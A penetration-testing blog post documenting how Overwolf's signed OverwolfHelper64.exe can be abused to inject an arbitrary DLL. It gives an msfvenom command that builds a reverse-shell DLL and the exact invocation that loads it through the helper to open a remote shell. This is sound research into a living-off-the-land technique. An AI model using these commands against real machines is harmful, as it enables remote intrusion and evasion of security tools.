---

layout: post

title: OverWolfHelperx64 - DLL Injection LOLBAS

gh-badge:

- star

- fork

- follow

tags:

- Windows

- Cyber Security

- Penetration Testing

comments: true

published: true

date: '2021-09-18'

---

Hello guys gals and non binary pals, today we're going to be looking at a program called OverWolf. Overwolf is a piece of software backed by Curse Forge, Intel, Logitech, Twitch, Ubisoft and a bunch of other companies that is designed to add extensions (or Mods) onto games. Some examples might include an overlay that shows your health or ammo count in a different style. But yeah -- you get the gist of it. It's a pretty interesting piece of software to analyze.

We're going to be using a pretty standard setup of [ProcMon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from SysInternals and [ProcessHacker](https://processhacker.sourceforge.io/downloads.php).

Overwolf can be downloaded from the following URL:
(https://www.overwolf.com/apps/)[https://www.overwolf.com/apps/]

It's a pretty standard install, so I'm not going to into too much detail on the install process. Just keep clicking "Next" until you see OverWolf finish installing.

### Overwolf Analysis

First we're going to open up ProcMon, and add a Process Filter -- we will be filtering on the Command Line and ensure it contains the string Overwolf. This will likely give us the best results.

![[https://blog.spookysec.net/img/Pasted image 20210918140933.png]](https://blog.spookysec.net/img/Pasted image 20210918140933.png)

Afterwards, click "Add" and "Apply". Next up, pop on open Process Hacker and use the "Search" function to specify Overwolf. I've split my screens for ease of use:

![[https://blog.spookysec.net/img/Pasted image 20210918141142.png]](https://blog.spookysec.net/img/Pasted image 20210918141142.png)

Next, we're going to launch Overwolf and see what happens.

If setup correctly, we should see a lot of new processes spawn in Process Hacker and ProcMon should see a whole bunch of new WindowsAPI functions get called as well as Programs get launched.

![[https://blog.spookysec.net/img/Pasted image 20210918141331.png]](https://blog.spookysec.net/img/Pasted image 20210918141331.png)

The Process Hacker window was fairly standard -- there was one important thing to note, the Updater spawned as NT AUTHORITY\SYSTEM. This is a very important thing to note if you're developing a Local Privilege Escalation exploit. If you capture the traffic with Wireshark and can decipher the upgrade protocol, you might be able to develop a LPE exploit. I'm not going to dig through that rabbit hole today though :).

Here, we are primarily looking for DLLs or Programs that get loaded as part of launching OverWolf. Just browsing through the running processes, one in particular stood out to me, OverWolfHelper/OverWolfHelper64.exe, it queried information on a process name "Audiodg.exe", a native windows binary. I found this particular one in ProcMon, however, it's also possible to locate it over in Process Hacker.

![[https://blog.spookysec.net/img/Pasted image 20210918144412.png]](https://blog.spookysec.net/img/Pasted image 20210918144412.png)
*Located in ProcMon*

![[https://blog.spookysec.net/img/Pasted image 20210918144523.png]](https://blog.spookysec.net/img/Pasted image 20210918144523.png)
*Located In Process Hacker*

Interestingly enough it appears like OverwolfHelper takes two arguments -- path and pid. These (to me) are some pretrty interesting arguments to take, especially when the path is pointing to a DLL.

```
"C:\Program Files (x86)\Common Files\Overwolf\0.178.0.16\OverwolfHelper64.exe" "path=C:\Program Files (x86)\Overwolf\0.178.0.16\OWExplorerLauncher.dll pid=1596"
```

Doing some basic analysis on this, we can see that the PID actually points to the parent Overwolf process. Interestingly enough, it (OWExplorerLauncher.dll) doesn't appear to be loaded. However, in OverwolfHelper.exe it does.

![[https://blog.spookysec.net/img/Pasted image 20210918193328.png]](https://blog.spookysec.net/img/Pasted image 20210918193328.png)

### Injecting a DLL

Let's try injecting a DLL with OverWolfHelper and see how it goes. On Kali, we're going to generate a DLL using MSFVenom.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f dll -o injectme.dll
```

![[https://blog.spookysec.net/img/Pasted image 20210918202742.png]](https://blog.spookysec.net/img/Pasted image 20210918202742.png)

After transporting the binary over, we're going to run the modified command:

```
"C:\Program Files (x86)\Common Files\Overwolf\0.178.0.16\OverwolfHelper64.exe" "path=C:\Users\Administrator\Downloads\injectme.dll pid=1596"
```


![[https://blog.spookysec.net/img/Pasted image 20210918203111.png]](https://blog.spookysec.net/img/Pasted image 20210918203111.png)

And checking over in our Terminal, it appears we have gotten a shell!

![[https://blog.spookysec.net/img/Pasted image 20210918203200.png]](https://blog.spookysec.net/img/Pasted image 20210918203200.png)

To figure out what's going on behind the scenes, we can pivot back over to ProcessHacker and go over to the "Network" tab and filter for our IP Address (192.168.0.198). It appears that it indirectly calls rundll32.exe

![[https://blog.spookysec.net/img/Pasted image 20210918205736.png]](https://blog.spookysec.net/img/Pasted image 20210918205736.png)

It appears that rundll32.exe spawned a child process, cmd.exe which would likely be a fairly large indicator of malware. I've created a directory called "notmalware" in my Netcat session and CD'd into that folder

![[https://blog.spookysec.net/img/Pasted image 20210918210210.png]](https://blog.spookysec.net/img/Pasted image 20210918210210.png)

It appears that the child process is indeed our Reverse Shell.

![[https://blog.spookysec.net/img/Pasted image 20210918210157.png]](https://blog.spookysec.net/img/Pasted image 20210918210157.png)

### Conclusion

It appears that OverwolfHelper (when it loads a DLL) runs rundll32 -- interestingly, our DLL isn't mentioned as any argument.

![[https://blog.spookysec.net/img/Pasted image 20210918210655.png]](https://blog.spookysec.net/img/Pasted image 20210918210655.png)
